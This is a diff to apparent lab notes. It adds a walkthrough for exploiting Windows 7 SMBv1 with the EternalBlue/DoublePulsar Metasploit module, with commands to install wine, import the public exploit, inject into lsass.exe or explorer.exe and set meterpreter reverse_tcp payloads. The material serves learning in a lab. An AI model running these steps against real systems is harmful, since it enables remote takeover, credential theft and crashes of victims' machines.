@@ -266,3 +266,29 @@ since we are in meterpreter we can enter 'shell' to get the dedicated windows cm
 DISCLAIMER: THE FOLLOWING EXTRA DIDN'T WORKOUT WHILE PERFORMING. TBE
 EXTRA: the same exploit when run in a 32 bit version of win7 it won't work even after the auxiliary scanner says that's its vulnerable to it
 but after switching off the firewall and if we try it, we get the BSOD(Blue scree of death) which actually crashes the system itself due to integer overflow(this overflow is caused by the exploit itself which couldn't be handled by a 32bit win7 PC)
+
+[VIDEO (MicrosoftDS(SMBv1) DoublePulsar Exploit)] WINDOWS 7 SP1 x64/x86
+NOTE: this exploit works only if windows firewall is turned off as in real world windows PCs when pinged, they normally filter it but one that's used to provide services to a company or elsewhere those ports would be opened, so we're not faking anything in here
+for this attack we need wine(application that's allows executing windows apps in linux). so the deps. and cmds for installing are as follows:
+> sudo dpkg --add-architecture i386 && apt-get update && apt-get install wine32
+after installing wine we need to know where the drive C:/ of wine is present, so we download python 2.7.14 x86(.msi) from python.org
+and run the following cmd to install it:
+wine msiexec /i <file_name>.msi
+then after installing we should now have the .wine/ folder inside the /root directory and to view it we need root acc.access
+then we need to clone the following exploit from git:
+> git clone https://github.com/Telefonica/Eternalblue-Doublepulsar-Metasploit.git
+then we have the copy the folder(deps/) and its contents present in Eternalblue-Doublepulsar-Metasploit/ into metasploit's exploit/windows/smb module directory (/usr/share/metasploit-framework/modules/exploits/windows/smb/) as follows:
+cp <cloned_directory>/Eternalblue-Doublepulsar-Metasploit/deps/ /usr/share/metasploit-framework/modules/exploits/windows/smb/ -r (-r to recursively copy deps/ folder's content)
+then do the same for eternalblue_doublepulsar.rb file present in Eternalblue-Doublepulsar-Metasploit/ into metasploit's exploit/windows/smb module directory (/usr/share/metasploit-framework/modules/exploits/windows/smb/) as follows:
+cp <cloned_directory>/Eternalblue-Doublepulsar-Metasploit/eternalblue_doublepulsar.rb /usr/share/metasploit-framework/modules/exploits/windows/smb/
+then we copy the cloned repo(Eternalblue-Doublepulsar-Metasploit/ folder & its contents) to /root/ directory as follows:
+cp <cloned_directory>/Eternalblue-Doublepulsar-Metasploit/ /root/ -r
+now open metasploit and then we use the following exploit we imported as follows:
+> use exploit/windows/smb/eternalblue_doublepulsar
+after selection now setting options such as RHOSTS, LHOST should be done along with exploit specifics such as follows:
+PROCESSINJECT - explorer.exe|lsass.exe (explorer for x86, lsass for x64)
+TARGETARCHITECTURE - x86|x64
+for settings payload for different archs. use as follows:
+> set payload windows/x64/meterpreter/reverse_tcp (for 64 bit)
+> set payload windows/meterpreter/reverse_tcp (for 32 bit)
+after setting all options and target specific payloads we then exploit the target using the 'run' cmd
